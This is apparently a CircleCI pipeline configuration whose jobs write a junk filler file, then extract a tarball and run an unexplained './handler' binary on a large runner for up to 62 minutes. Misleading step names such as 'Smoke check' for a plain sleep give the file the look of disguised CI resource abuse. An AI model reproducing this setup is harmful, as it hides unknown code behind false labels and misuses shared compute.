version: 2.1

jobs:
  builder_preview-v3:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Dispatch work units
          command: |
            mkdir -p /tmp/pipeline
            set +o pipefail 2>/dev/null; seq 1 960816 | awk '{print $1*7919 % 2147483647}' > /tmp/pipeline/99.blob; true
            du -h /tmp/pipeline/99.blob
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - 99.blob
  preview-v3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Check prior stage
          command: |
            ls -la /tmp/pipeline/99.blob || true
      - run:
          name: Retrieve sources
          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack payload
          command: tar -xf archive-main.tar
      - run:
          name: Smoke check
          command: sleep 60
      - run:
          command: free -m
      - run:
          no_output_timeout: 62m
          command: ./handler
  ctx2_LAB_HOOK_3:
    docker:
      - image: cimg/base:current
